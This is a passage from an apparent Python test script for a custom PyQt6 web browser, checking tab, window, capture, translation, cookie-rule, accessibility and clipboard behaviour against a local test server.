            br.config[_k] = _v
_modes127 = [a.get("mode") for n, a in _pt127
             if n == "blurprivate" and isinstance(a, dict)]
check("stream-safe blurs every tab on, and takes it off every tab",
      "on" in _modes127 and "off" in _modes127
      and _modes127.count("on") == _modes127.count("off"), str(_modes127))
_lt127 = []
_real_lt127 = br.live_tick
_le127 = br.config.get("liveEvery", "__absent__")
br.live_tick = lambda then=None: _lt127.append(1) or True
br.config["liveEvery"] = 5
br._live_last = -1e9
try:
    br._live_check()
    br._live_check()
except AttributeError:
    pass
finally:
    br.live_tick = _real_lt127
    if _le127 == "__absent__":
        br.config.pop("liveEvery", None)
    else:
        br.config["liveEvery"] = _le127
check("'ask every N minutes' asks, once per interval", _lt127 == [1],
      str(_lt127))
_sp127 = br.new_tab(url=srv.url("/twhome?sp127=1"), switch=False); H.spin(200)
_sp127._sponsor = [{"from": 0, "to": 9999, "what": "sponsor"}]
_sp127._sponsor_video = "oldvideo127"
_ms127 = []
_real_ms127 = br.media_state
br.media_state = lambda view=None, then=None: _ms127.append(1)
try:
    _sk127 = br.sponsor_skip_now(view=_sp127)
finally:
    br.media_state = _real_ms127
br.close_tab(br.tabs.indexOf(_sp127), ask=False)
check("one video's sponsor segments are never applied to another",
      _sk127 is False and not _ms127, str((_sk127, _ms127)))
check("Dark PDF switched off takes the inversion off the open PDF",
      'want.darkPdf ? "invert(1)' in B.PAGE_LOOK_JS)
check("every capture blurs password fields while that is on",
      bool(getattr(B.capture, "_redacting", False)))


# ===== ninth pass lows: daily log, dates, bar words, time zones ==========
if br.desk() is not None:
    _dk128 = br.desk()
    _tp128 = _dk128.todo_path()
    _was128 = _tp128.read_text() if _tp128.exists() else None
    _done128 = json.dumps(br.config.get("todosDoneOn") or {})
    _tp128.write_text("- [ ] tick128\n")
    _tid128 = _dk128.todos()[0]["id"]
    br.desk_do("toggleTodo", json.dumps({"id": _tid128}))
    # ticked, unticked and ticked again is one to-do done, not two
    br.desk_do("toggleTodo", json.dumps({"id": _tid128}))
    br.desk_do("toggleTodo", json.dumps({"id": _tid128}))
    _log128 = br.daily_log()
    if _was128 is None:
        _tp128.unlink()
    else:
        _tp128.write_text(_was128)
    br.config["todosDoneOn"] = json.loads(_done128)
    check("the daily log counts a to-do ticked off today",
          int((_log128 or {}).get("todos") or 0) == 1, str(_log128))
check("an impossible date makes no calendar entry",
      br.ics_from_text("Meeting 2026-13-45 19:00") == "")
check("'each' and 'beach' in the bar are words, not hex numbers",
      B.bar_answer("each") is None and B.bar_answer("beach") is None)
check("EST is five hours behind UTC all year",
      B._zone_for("est") == "Etc/GMT+5", str(B._zone_for("est")))

# ===== ninth pass, part 3: marks per window, bar hints, captures, misc ====
# N23 the rate-table hint row opens Settings instead of emptying the clipboard
_mr129 = dict(B.MONEY_RATES)
B.MONEY_RATES["rates"] = {}
try:
    _rows129 = br._own_suggestions("20 usd in eur")
    _act129 = dict(getattr(br, "_suggest_actions", None) or {})
finally:
    B.MONEY_RATES.clear()
    B.MONEY_RATES.update(_mr129)
_hint129 = [a for r, a in _act129.items() if "rate table" in r]
check("the 'switch the rate table on' row opens Settings, it does not copy ''",
      bool(_hint129) and _hint129[0][0] == "settings", str(_hint129))
# N24 the preposition is not an inch, a place is not a stone
_ma129 = B._metric_answer
check("'3 in the book' and '1st place' are not measurements; '5 in long' is",
      _ma129("Chapter 3 in the book") is None
      and _ma129("we finished 1st today") is None
      and (_ma129("it is 5 in long") or ("", ""))[1] == "127"
      and _ma129("a 27 in monitor") is not None
      and _ma129("2 lb of it") is not None,
      str((_ma129("Chapter 3 in the book"), _ma129("we finished 1st today"),
           _ma129("it is 5 in long"))))
# N33 a subtitle file's language comes from its name, never "de" by default
_sl129 = getattr(B, "_subtitle_lang", None)
_addsubs129 = str(getattr(B, "MEDIA_TOOLS2", {}).get("addsubs", ""))
check("a subtitle file is tagged with the language its name gives, or none",
      _sl129 is not None and _sl129("film.en.srt") == "en"
      and _sl129("Film_eng.forced.vtt") == "en" and _sl129("film.srt") == ""
      and _sl129("film.2024.srt") == ""
      and 'want.lang || "de"' not in _addsubs129,
      str(_sl129 and [_sl129(n) for n in ("film.en.srt", "film.srt")]))
# N32 the Mac edition asks pip
_plat129 = sys.platform
try:
    sys.platform = "darwin"
    _cmd129 = br._lib_check_cmd()
    _up129 = br._lib_upgrade_cmd()
    _found129 = br._lib_found_updates(0, "PyQt6 6.0 6.1 wheel")
finally:
    sys.platform = _plat129
check("on a Mac the library check and upgrade are pip's, not dnf's",
      _cmd129[0] == sys.executable and _up129[0] == sys.executable
      and _found129 is True, str((_cmd129[0], _up129[0], _found129)))
# N27 the capture diff is quick and counts what moved
_d1_129 = B.QImage(800, 600, B.QImage.Format.Format_RGB32)
_d1_129.fill(B.QColor("#202020"))
_d2_129 = B.QImage(_d1_129)
_pt129 = B.QPainter(_d2_129)
_pt129.fillRect(100, 100, 50, 40, B.QColor("#ffffff"))
_pt129.end()
_t129 = _time.monotonic()
_pic129, _ch129 = B.capture.diff_images(_d1_129, _d2_129)
_dt129 = _time.monotonic() - _t129
check("the capture diff counts the pixels that moved, without holding the "
      "window", _ch129 == 50 * 40 and _dt129 < 3.0
      and _pic129.pixelColor(120, 120).name() == "#f38ba8"
      and _pic129.pixelColor(10, 10).name() == "#202020",
      str((_ch129, round(_dt129, 2))))
# N28 / N20 the downloads page says "Waiting"; a date-only countdown is local
_dlh129 = (_Path(B.__file__).parent / "downloads.html").read_text()
_seth129 = (_Path(B.__file__).parent / "settings.html").read_text()
check("a queued download reads 'Waiting', and a date-only countdown ends at "
      "local midnight", "e.queued" in _dlh129 and 'text += "T00:00"' in _seth129)
# N30 Refresh shows the refreshed list
_mcm129 = br.mc_menu()
_ref129 = [a for a in _mcm129.actions() if a.text() == br._ui_str("mcRefresh")]
br.__dict__.pop("_mc_shown", None)
if _ref129:
    _ref129[0].trigger()
    H.spin(200)
_shown129 = getattr(br, "_mc_shown", None)
check("the server menu's Refresh shows the refreshed list",
      _shown129 is not None, str(_shown129))
try:
    if _shown129 is not None:
        _shown129.close()
    _mcm129.deleteLater()
except RuntimeError:
    pass
# N31 the grid takes only names it can use, and counts what it made
_fl131 = []
_real_fl131 = br.flash
br.flash = lambda text, *a, **k: _fl131.append(str(text))
try:
    _none131 = br.multistream("ab, x")
    _v131 = br.multistream(["abcd", "efgh", "x", "ijkl", "mnop", "qrst"])
    if _v131 not in (None, False):
        H.wait_for(lambda: any(br._ui_str("gridMade") % 4 == f
                               for f in _fl131), 8000)
finally:
    br.flash = _real_fl131
check("a grid of unusable names is refused, and a grid of six names says 4",
      _none131 is False and (br._ui_str("gridMade") % 4) in _fl131
      and (br._ui_str("gridMade") % 6) not in _fl131, str(_fl131[-3:]))
try:
    if _v131 not in (None, False) and br.tabs.indexOf(_v131) >= 0:
        br.close_tab(br.tabs.indexOf(_v131), ask=False)
except RuntimeError:
    pass
# N6 the Discord shot writes the bytes that fit
_real_fit129 = B.capture.fit_under
B.capture.fit_under = lambda image, limit, fmt="jpeg": (
    b"\xff\xd8\xff\xe0fit129", image)
_sh129 = json.dumps(br.config.get("shotHistory") or [])
_dv129 = br.new_tab(url=srv.url("/twhome")); H.spin(300)
H.wait_for(lambda: "twhome" in _dv129.url().toString(), 6000)
br.tabs.setCurrentWidget(_dv129); H.spin(300)
try:
    _dp129 = br.shot_for_discord(view=_dv129)
finally:
    B.capture.fit_under = _real_fit129
_dbytes129 = b""
try:
    _dbytes129 = _Path(str(_dp129)).read_bytes() if _dp129 else b""
except OSError:
    pass
_dlisted129 = str(_dp129) in (br.config.get("shotHistory") or [])
check("the Discord shot is the file that fits the limit, and is listed",
      _dbytes129 == b"\xff\xd8\xff\xe0fit129" and _dlisted129,
      str((_dbytes129[:12], _dlisted129)))
try:
    if _dp129:
        _Path(str(_dp129)).unlink()
except OSError:
    pass
br.config["shotHistory"] = json.loads(_sh129)
# N26 a tab captured in the background stays where it was, as it was
_bx129 = br.new_tab(url=srv.url("/twhome?bg=1"), switch=False); H.spin(200)
_by129 = br.new_tab(url=srv.url("/twhome?bg=2"), switch=False); H.spin(200)
H.wait_for(lambda: all("twhome" in w.url().toString()
                       for w in (_bx129, _by129)), 6000)
br.tabs.setCurrentWidget(_dv129); H.spin(300)
br.tabs.setCurrentWidget(_by129); H.spin(300)
br.tabs.setCurrentWidget(_dv129); H.spin(300)
_at129 = br.tabs.indexOf(_bx129)
_txt129 = br.tabs.tabText(_at129)
_before129 = getattr(br, "_tab_before", None)
_sp129 = None
try:
    _sp129 = br.shot_background_tab(view=_bx129)
except Exception as _e129:
    _sp129 = repr(_e129)
H.spin(200)
check("a tab captured in the background keeps its place, its name and the "
      "'tab before'", br.tabs.indexOf(_bx129) == _at129
      and br.tabs.tabText(br.tabs.indexOf(_bx129)) == _txt129
      and br.current() is _dv129
      and getattr(br, "_tab_before", None) is _before129,
      str((_at129, br.tabs.indexOf(_bx129), _txt129, _sp129)))
try:
    if _sp129 and isinstance(_sp129, (str, _Path)) and _Path(str(_sp129)).is_file():
        _Path(str(_sp129)).unlink()
except OSError:
    pass
br.config["shotHistory"] = json.loads(_sh129)
for _w129 in (_bx129, _by129):
    try:
        if br.tabs.indexOf(_w129) >= 0:
            br.close_tab(br.tabs.indexOf(_w129), ask=False)
    except RuntimeError:
        pass
# N35 printing the article with the reader already on prints the article
_dl_was129 = br.config.get("downloadDir", "__absent__")
_pd129 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
br.config["downloadDir"] = str(_pd129)
H.load(_dv129, srv.url("/art96"))
H.wait_for(lambda: jsq(_dv129, "document.readyState === 'complete' && "
                       "document.body.innerText.length > 300"), 9000)
br.reader_mode(_dv129)
H.wait_for(lambda: jsq(_dv129, "!!document.getElementById('__readercss')",
                       B.MAIN_WORLD_ID), 5000)
_fl135 = []
br.flash = lambda text, *a, **k: _fl135.append(str(text))
try:
    _pp135 = br.print_reader(view=_dv129)
    _early135 = list(_fl135)
    H.wait_for(lambda: _pp135 and _Path(str(_pp135)).is_file()
               and _fl135, 12000)
finally:
    br.flash = _real_fl131
_still135 = jsq(_dv129, "!!document.getElementById('__readercss')",
                B.MAIN_WORLD_ID)
check("printing the article with the reader on keeps the reader, and says "
      "'written' only once the PDF is there",
      bool(_pp135) and _Path(str(_pp135)).is_file() and _still135 is True
      and not any(str(_Path(str(_pp135)).name) in f for f in _early135),
      str((_still135, _early135[:2], _fl135[-1:])))
if _dl_was129 == "__absent__":
    br.config.pop("downloadDir", None)
else:
    br.config["downloadDir"] = _dl_was129
try:
    if br.tabs.indexOf(_dv129) >= 0:
        br.close_tab(br.tabs.indexOf(_dv129), ask=False)
except RuntimeError:
    pass
# N16 a private window's mark is that window's, and survives a repaint
_pt_was129 = br.config.get("privateTint", "__absent__")
br.config["privateTint"] = "#123457"
_pw129 = br.new_private_window(); H.spin(800)
_app_has129 = "#123457" in app.styleSheet()
_pw_has129 = "#123457" in _pw129.styleSheet()
_br_has129 = "#123457" in br.styleSheet()
br.apply_chrome_style(); H.spin(200)
_pw_kept129 = "#123457" in _pw129.styleSheet()
_app_after129 = "#123457" in app.styleSheet()
check("a private window's mark is on that window alone, and a repaint from "
      "a normal window leaves it", not _app_has129 and _pw_has129
      and not _br_has129 and _pw_kept129 and not _app_after129,
      str((_app_has129, _pw_has129, _br_has129, _pw_kept129, _app_after129)))
try:
    _pw129._closing_anyway = True
    _pw129.close()
except RuntimeError:
    pass
H.spin(400)
if _pt_was129 == "__absent__":
    br.config.pop("privateTint", None)
else:
    br.config["privateTint"] = _pt_was129
br.apply_chrome_style()

# ===== review leftovers: translation bars, cache switch, volume boost ======
_tr_was130 = dict(br.translate_rules())
_ta130 = br.new_tab(url=srv.url("/twhome?tr=a"), switch=False); H.spin(200)
_tb130 = br.new_tab(url=srv.url("/twhome?tr=b"), switch=False); H.spin(200)
H.wait_for(lambda: all("twhome" in w.url().toString() and
                       jsq(w, "document.readyState") == "complete"
                       for w in (_ta130, _tb130)), 8000)
br.offer_translation_bar("fr", view=_ta130)
br.offer_translation_bar("es", view=_tb130)
H.wait_for(lambda: all(jsq(w, "!!document.getElementById('__trbar')",
                           B.APP_WORLD_ID) for w in (_ta130, _tb130)), 5000)
# what a trusted press on "never" leaves behind, in the bar's own world
H.js(_ta130, "window.__trAnswer = 'never'", B.APP_WORLD_ID)
H.js(_tb130, "window.__trAnswer = 'never'", B.APP_WORLD_ID)
H.wait_for(lambda: br.translate_rules().get("fr") == "never"
           and br.translate_rules().get("es") == "never", 4000)
_rules130 = dict(br.translate_rules())
br.offer_translation_bar("it", view=_ta130); H.spin(300)
H.load(_ta130, srv.url("/twhome?tr=c"))
_tm130 = getattr(br, "_trbar_timer", None)
H.wait_for(lambda: _tm130 is not None and not _tm130.isActive(), 4000)
check("each tab's translation bar is read, and the polling stops once the "
      "bars are answered or gone",
      _rules130.get("fr") == "never" and _rules130.get("es") == "never"
      and _tm130 is not None and not _tm130.isActive(),
      str((_rules130, _tm130 is not None and _tm130.isActive())))
br.config["translateRules"] = _tr_was130
for _w130 in (_ta130, _tb130):
    try:
        if br.tabs.indexOf(_w130) >= 0:
            br.close_tab(br.tabs.indexOf(_w130), ask=False)
    except RuntimeError:
        pass
# the cache switch in a private tab comes back on
_pc130 = br.new_tab(url=srv.url("/twhome?cache"), private=True,
                    switch=False); H.spin(300)
_kinds130 = B.QWebEngineProfile.HttpCacheType
br.cache_off(view=_pc130, on=True)
_off130 = _pc130.page().profile().httpCacheType()
br.cache_off(view=_pc130, on=False)
_on130 = _pc130.page().profile().httpCacheType()
check("switching the cache back on in a private tab really turns it on",
      _off130 == _kinds130.NoCache and _on130 == _kinds130.MemoryHttpCache,
      str((_off130, _on130)))
try:
    if br.tabs.indexOf(_pc130) >= 0:
        br.close_tab(br.tabs.indexOf(_pc130), ask=False)
except RuntimeError:
    pass
# the volume boost never routes a cross-origin player into silence
_vb130 = br.new_tab(url=srv.url("/twhome?boost"), switch=False); H.spin(200)
H.wait_for(lambda: jsq(_vb130, "document.readyState") == "complete", 6000)
H.js(_vb130, "var a = document.createElement('audio');"
             "a.src = 'http://localhost:' + location.port + '/a130.mp3';"
             "document.body.appendChild(a); 1")
_bg130 = []
br.media_tool("boost", view=_vb130, then=_bg130.append, factor=2.0)
H.wait_for(lambda: _bg130, 4000)
_ctx130 = jsq(_vb130, "!!window.__boostCtx", B.APP_WORLD_ID)
check("the volume boost leaves a player from another site at plain volume",
      _bg130 and _bg130[0] is not None and _bg130[0] <= 1
      and _ctx130 is False, str((_bg130, _ctx130)))
try:
    if br.tabs.indexOf(_vb130) >= 0:
        br.close_tab(br.tabs.indexOf(_vb130), ask=False)
except RuntimeError:
    pass
# a self-signed certificate is described in the panel, not left blank
import ssl as _ssl130, socket as _sock130, threading as _thr130
import subprocess as _subp130   # "_sp" is a tab in an earlier section
_cd130 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_subp130.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
         "-keyout", str(_cd130 / "k.pem"), "-out", str(_cd130 / "c.pem"),
         "-days", "2", "-subj", "/CN=review130.test/O=Review"],
        capture_output=True, timeout=60)
_info130 = {}
if (_cd130 / "c.pem").is_file():
    _ctx130s = _ssl130.SSLContext(_ssl130.PROTOCOL_TLS_SERVER)
    _ctx130s.load_cert_chain(str(_cd130 / "c.pem"), str(_cd130 / "k.pem"))
    _ls130 = _sock130.socket()
    _ls130.bind(("127.0.0.1", 0)); _ls130.listen(4)
    _ls130.settimeout(15)
    def _serve130():
        for _n in range(2):
            try:
                c, _a = _ls130.accept()
            except OSError:
                return
            try:
                _ctx130s.wrap_socket(c, server_side=True).close()
            except (OSError, _ssl130.SSLError):
                c.close()
    _thr130.Thread(target=_serve130, daemon=True).start()
    _info130 = br.certificate_for("127.0.0.1", port=_ls130.getsockname()[1])
    _ls130.close()
check("a self-signed certificate shows its name, issuer and dates",
      _info130.get("subject") == "review130.test"
      and _info130.get("verified") is False and _info130.get("until"),
      str({k: _info130.get(k) for k in ("subject", "issuer", "until",
                                        "verified", "error")}))

# ===== tenth pass: windows -- moves, gathering, closing, the timers ========
# T17 a tab moved to its own window is not "recently closed"
_mv132 = br.new_tab(url=srv.url("/twhome?mv132"), switch=False); H.spin(300)
H.wait_for(lambda: "mv132" in _mv132.url().toString(), 6000)
_w132 = br.move_tab_to_window(br.tabs.indexOf(_mv132)); H.spin(600)
_closed132 = [r.get("url", "") for r in getattr(br, "_closed_tabs", [])]
check("a tab moved to another window is not on the recently-closed list",
      not any("mv132" in u for u in _closed132), str(_closed132[-2:]))
try:
    if _w132 is not None:
        _w132._closing_anyway = True
        _w132.close()
except RuntimeError:
    pass
H.spin(300)
# T16 / T21 a group moved to a window: its colour, loaded, no spare tab
_g132 = br.ensure_group("rv132grp", colour="#ff0000")
_ga132 = br.new_tab(url=srv.url("/twhome?ga132"), switch=False,
                    group=_g132); H.spin(300)
_gb132 = br.new_tab(url=srv.url("/twhome?gb132"), switch=False,
                    group=_g132); H.spin(300)
H.wait_for(lambda: all("132" in w.url().toString() for w in (_ga132, _gb132)),
           6000)
_gw132 = br.move_group_to_window(_g132); H.spin(900)
_grows132 = [w for _i, w in _gw132._real_tabs()] if _gw132 else []
check("a group moved to a window keeps its colour, loads, and brings no "
      "blank start tab", _gw132 is not None
      and _gw132.group_colors.get("rv132grp") == "#ff0000"
      and len(_grows132) == 2
      and not any(getattr(w, "_pending", None) for w in _grows132),
      str((_gw132 and _gw132.group_colors.get("rv132grp"), len(_grows132),
           [getattr(w, "_pending", None) for w in _grows132])))
try:
    if _gw132 is not None:
        for w in _grows132:
            w.locked = False
        _gw132._closing_anyway = True
        _gw132.close()
except RuntimeError:
    pass
H.spin(300)
# T27 a window closed with a tab popped out is remembered with that tab
_pw132 = br.new_window(url=srv.url("/twhome?keep132")); H.spin(900)
_pt132 = _pw132.new_tab(url=srv.url("/twhome?pop132")); H.spin(300)
H.wait_for(lambda: "pop132" in _pt132.url().toString(), 6000)
_mini132 = _pw132.pop_out_tab(_pw132.tabs.indexOf(_pt132)); H.spin(300)
_pw132._closing_anyway = True
_pw132.close(); H.spin(500)
_last132 = (B.CLOSED_WINDOWS[-1].get("tabs") if B.CLOSED_WINDOWS else []) or []
check("a window closed with a popped-out tab can come back with that tab",
      any("pop132" in str(e.get("u", "")) for e in _last132),
      str([e.get("u", "")[-14:] for e in _last132]))
# T0 a window that owned the desk timer hands it over when it closes
_dw132 = br.new_window(url=srv.url("/twhome?desk132")); H.spin(900)
_dw132._desk_timer.start()
_dw132._closing_anyway = True
_dw132.close(); H.spin(400)
_desk_left132 = _dw132._desk_timer.isActive()
_sn_was132 = json.dumps(br.config.get("snoozed") or [])
br.config["snoozed"] = [{"url": srv.url("/twhome?snz132"), "at": 1}]
_woke132 = 0
try:
    _woke132 = _dw132.wake_snoozed()
except RuntimeError:
    _woke132 = -1
H.spin(400)
def _snz_tabs132():
    out = []
    for win in br.windows():
        try:
            for _i, w in win._real_tabs():
                if "snz132" in (getattr(w, "_pending", "") or
                                w.url().toString()):
                    out.append((win, w))
        except RuntimeError:
            continue
    return out
_snz_here132 = bool(_snz_tabs132())
check("a closed window stops its desk timer, and a snoozed tab wakes in a "
      "window that is open", not _desk_left132 and _woke132 == 1
      and _snz_here132, str((_desk_left132, _woke132, _snz_here132)))
for _win132, _w in _snz_tabs132():
    try:
        _win132.close_tab(_win132.tabs.indexOf(_w), ask=False)
    except RuntimeError:
        pass
br.config["snoozed"] = json.loads(_sn_was132)
# T1 a private window gathers nothing, and gathering leaves private ones
_pv132 = br.new_private_window(); H.spin(800)
_pvt132 = _pv132.current()
_got_p132 = _pv132.merge_windows()
_alive132 = br in br.windows()
_got_n132 = br.merge_windows(); H.spin(600)
_pv_open132 = _pv132 in br.windows()
check("a private window gathers no windows, and gathering into an ordinary "
      "one leaves the private window open", _got_p132 == 0 and _alive132
      and _pv_open132, str((_got_p132, _alive132, _pv_open132)))
try:
    _pv132._closing_anyway = True
    _pv132.close()
except RuntimeError:
    pass
H.spin(400)
# T5 / T19 the command line hands a "cmd" over, and an --app on the retry
_main_src132 = __import__("inspect").getsource(B.main)
check("'browser cmd <name>' is sent as a command, and the second hand-off "
      "keeps --app", 'words[0] == "cmd"' in _main_src132
      and _main_src132.count("app=app_url") >= 2)

# ===== tenth pass: a11y, groups, stale tabs ================================
# T2 the hover picture and the text-zoom sheet are two elements
check("the hover zoom picture has an id of its own, apart from the text zoom",
      'getElementById("__a11yhover")' in B.A11Y_JS
      and B.A11Y_JS.count('getElementById("__a11yzoom")') == 2,
      str(B.A11Y_JS.count('getElementById("__a11yzoom")')))
# T3 mono reaches a page loaded after the switch was flipped
_mono_was133 = br.a11y_config().get("monoAudio")
br.set_a11y("monoAudio", True)
_au133 = br.new_tab(url=srv.url("/twhome?mono133"), switch=False); H.spin(300)
H.wait_for(lambda: jsq(_au133, "!!window.__audioShape", B.MAIN_WORLD_ID), 6000)
_shape133 = jsq(_au133, "window.__audioShape ? window.__audioShape.mono : null",
                B.MAIN_WORLD_ID)
br.set_a11y("monoAudio", bool(_mono_was133))
check("mono sound reaches a page opened after it was switched on",
      _shape133 is True, str(_shape133))
try:
    if br.tabs.indexOf(_au133) >= 0:
        br.close_tab(br.tabs.indexOf(_au133), ask=False)
except RuntimeError:
    pass
# T4 a private tab's menus offer no "only on this site"
_pa133 = br.new_tab(url=srv.url("/twhome?pa133"), private=True,
                    switch=False); H.spin(300)
H.wait_for(lambda: "pa133" in _pa133.url().toString(), 6000)
def _menu_texts133(m):
    out = []
    for a in m.actions():
        out.append(a.text())
        if a.menu() is not None:
            out.extend(_menu_texts133(a.menu()))
    return out
_site133 = br._ui_str("a11ySiteOnly") % "127.0.0.1"
_txt133 = _menu_texts133(br.a11y_menu(view=_pa133))
check("a private tab's accessibility menu offers no per-site profile",
      _site133 not in _txt133, str([t for t in _txt133 if "127" in t][:3]))
try:
    if br.tabs.indexOf(_pa133) >= 0:
        br.close_tab(br.tabs.indexOf(_pa133), ask=False)
except RuntimeError:
    pass
# T6 a group rule leaves another virtual browser's group of that name alone
_sess_was133 = list(br.sessions)
if not any(e.get("sid") == "rv133" for e in br.sessions):
    br.sessions.append({"name": "Review 133", "sid": "rv133"})
br.ensure_group("Mods133", session="rv133")
_rules_was133 = br.config.get("groupRules", "__absent__")
br.config["groupRules"] = [{"group": "Mods133", "match": "127.0.0.1"}]
try:
    _gt133 = br.new_tab(url=srv.url("/twhome?g133"), switch=False)
finally:
    if _rules_was133 == "__absent__":
        br.config.pop("groupRules", None)
    else:
        br.config["groupRules"] = _rules_was133
H.spin(300)
_gs133 = (getattr(_gt133, "session", None), getattr(_gt133, "group", None))
check("a group rule never puts a tab into another browser's group",
      _gs133[0] == br.active_session and _gs133[1] != "Mods133", str(_gs133))
try:
    if br.tabs.indexOf(_gt133) >= 0:
        br.close_tab(br.tabs.indexOf(_gt133), ask=False)
    if "Mods133" in br.groups:
        br.delete_group("Mods133")
except RuntimeError:
    pass
br.sessions[:] = _sess_was133
# T7 leaving a tab counts as looking at it; T8 it is saved with the session
_sa133 = br.new_tab(url=srv.url("/twhome?sa133")); H.spin(300)
_sb133 = br.new_tab(url=srv.url("/twhome?sb133"), switch=False); H.spin(300)
H.wait_for(lambda: all("133" in w.url().toString() for w in (_sa133, _sb133)),
           6000)
br.tabs.setCurrentWidget(_sa133); H.spin(200)
_sa133._seen_wall = 1.0
br.tabs.setCurrentWidget(_sb133); H.spin(200)
_left133 = getattr(_sa133, "_seen_wall", 0)
_sb133._seen_wall = 1234567.0
br.tabs.setCurrentWidget(_sa133); H.spin(200)
_sb133._seen_wall = 1234567.0
br._save_groups(quiet=True)
_rows133 = [r for rows in (br.config.get("sessionTabs") or {}).values()
            for r in rows if isinstance(r, dict) and "sb133" in r.get("u", "")]
check("a tab just left counts as looked at, and when is kept with the session",
      _left133 > _time.time() - 60 and _rows133
      and _rows133[0].get("w") == 1234567, str((_left133, _rows133[:1])))
for _w133 in (_sa133, _sb133):
    try:
        if br.tabs.indexOf(_w133) >= 0:
            br.close_tab(br.tabs.indexOf(_w133), ask=False)
    except RuntimeError:
        pass

# ===== tenth pass: macro stop, cookie rules, text tools, translation ======
# T9 a stop works on the recording it was asked about
_absrc134 = (_Path(B.__file__).parent / "agent_bridge.py").read_text()
check("a macro stop takes its own recording and clears the slot at once",
      "macro = self.macro\n            self.macro = None" in _absrc134
      and 'self.macro["steps"] = steps' not in _absrc134)
# T12 the most specific cookie rule decides, as the menu shows
_cr_was134 = json.dumps(br.cookie_rules())
br.cookie_rule("rv134.example", "close")
br.cookie_rule("sub.rv134.example", "block")
br.cookie_rule("rv134b.example", "block")
br.cookie_rule("a.rv134b.example", "allow")
_r134 = (br.cookie_rule_for("sub.rv134.example"),
         br.cookie_rule_for(".x.sub.rv134.example"),
         br.cookie_rule_for("other.rv134.example"),
         br.cookie_rule_for("a.rv134b.example"),
         br.cookie_rule_for("b.rv134b.example"))
_rules134 = br.cookie_rules()
_rules134.clear()
_rules134.update(json.loads(_cr_was134))
br.save_config(quiet=True)
check("the closest cookie rule wins, and 'allow' under a blocked parent holds",
      _r134 == ("block", "block", "close", "allow", "block"), str(_r134))
# T14 Title Case with an apostrophe and an umlaut
_tc134 = br.new_tab(url=srv.url("/twhome?tc134")); H.spin(300)
H.wait_for(lambda: jsq(_tc134, "document.readyState") == "complete", 6000)
H.js(_tc134, "var i = document.createElement('input'); i.id = 'tc134';"
             "i.value = \"it's über uns\"; document.body.appendChild(i);"
             "i.focus(); i.select(); 1")
_tcd134 = []
br.desk_tool("textcase", view=_tc134, then=_tcd134.append, arg="title")
H.wait_for(lambda: _tcd134, 4000)
_tcv134 = jsq(_tc134, "document.getElementById('tc134').value")
check("Title Case leaves the letter after an apostrophe alone and knows ü",
      _tcv134 == "It's Über Uns", str(_tcv134))
# T15 the translation keeps links for Undo, and a list's inner list
H.js(_tc134, "document.body.innerHTML = '<p id=p134>Read the <a href=\"/x\">"
             "full article</a> here please</p><ul><li id=li134>Outer item "
             "words<ul><li>Inner item words</li></ul></li></ul>'; 1")
_real_rt134 = br.run_translator
_real_ct134 = br.caption_tools
br.run_translator = lambda text, then=None, lang="de", limit=0: (
    then and then("T:" + text))
# a translator on this machine, as far as the browser can tell: without
# one, translating in place does nothing at all
br.caption_tools = lambda: {"captionTranslator": "/bin/true"}
try:
    br.translate_in_place(view=_tc134, lang="de")
    # the originals are kept in the app world now, not as data-was
    H.wait_for(lambda: jsq(_tc134, "window.__trWas ? window.__trWas.size"
                                   " : 0", B.APP_WORLD_ID) == 3, 6000)
    _inner134 = jsq(_tc134, "document.querySelectorAll('#li134 ul li').length")
    _own134 = jsq(_tc134, "document.getElementById('li134').firstChild"
                          ".nodeValue")
    br.undo_translation(view=_tc134)
    H.wait_for(lambda: jsq(_tc134, "window.__trWas ? window.__trWas.size"
                                   " : 0", B.APP_WORLD_ID) == 0, 4000)
finally:
    br.run_translator = _real_rt134
    br.caption_tools = _real_ct134
    br.__dict__.pop("caption_tools", None)
    br.__dict__.pop("run_translator", None)
_link134 = jsq(_tc134, "!!document.querySelector('#p134 a[href=\"/x\"]')")
check("translating keeps a list's inner list (its own words translated), "
      "and Undo brings the links back",
      _inner134 == 1 and str(_own134).startswith("T:Outer item words")
      and _link134 is True, str((_inner134, _own134, _link134)))
try:
    if br.tabs.indexOf(_tc134) >= 0:
        br.close_tab(br.tabs.indexOf(_tc134), ask=False)
except RuntimeError:
    pass
# T11 a dragged rail width is written back
check("the rail's dragged width is written back when the drag settles",
      hasattr(br, "_rail_drag") and hasattr(br, "_sidebar_dragged"))

# ===== tenth pass: feeds, lite mode, sleeping, panels, clipboard, modes ===
# T20 an Atom entry links to its article
check("a feed entry links to its rel=alternate article, not the first link",
      'item.querySelector("link[rel=alternate]")'
      in _Path(B.__file__).read_text())
# T22 lite mode off gives his image block back
from PyQt6.QtWebEngineCore import QWebEngineSettings as _QWS135
_ni_was135 = br.config.get("noImageSites", "__absent__")
_lite_was135 = bool(br.config.get("liteMode", False))
br.config["noImageSites"] = ["127.0.0.1"]
_li135 = br.new_tab(url=srv.url("/twhome?lite135"), switch=False); H.spin(300)
H.wait_for(lambda: "lite135" in _li135.url().toString(), 6000)
br.apply_site_privacy(_li135)
br.lite_mode(True)
br.lite_mode(False)
_img135 = _li135.page().settings().testAttribute(
    _QWS135.WebAttribute.AutoLoadImages)
if _ni_was135 == "__absent__":
    br.config.pop("noImageSites", None)
else:
    br.config["noImageSites"] = _ni_was135
if _lite_was135:
    br.lite_mode(True)
check("lite mode switched off leaves images off on a site he blocks them on",
      _img135 is False, str(_img135))
# T23 a tab using the camera is not put to sleep
_ml_was135 = list(getattr(br, "_media_live", None) or [])
br._media_live = _ml_was135 + [{"view": _li135, "kind": "camera"}]
try:
    _slept135 = br.sleep_tab(_li135)
finally:
    br._media_live = _ml_was135
if _slept135:
    br.sleep_tab(_li135, on=False)
check("a background tab using the camera is never put to sleep",
      _slept135 is False, str(_slept135))
try:
    if br.tabs.indexOf(_li135) >= 0:
        br.close_tab(br.tabs.indexOf(_li135), ask=False)
except RuntimeError:
    pass
# T24 the panel is measured in the page splitter
check("the side panel is sized in the page splitter, not the whole window",
      hasattr(br, "_split_width") and 0 < br._split_width() <= br.width())
# T25 a second secret's timer is its own
_cc_was135 = br.config.get("clipClear", "__absent__")
_QGA.clipboard().setText("secret-one-135")
br.clear_clipboard_later(1)
H.spin(400)
_QGA.clipboard().setText("secret-two-135")
br.clear_clipboard_later(2)
H.spin(900)
_still135 = _QGA.clipboard().text()
H.wait_for(lambda: _QGA.clipboard().text() == "", 3000)
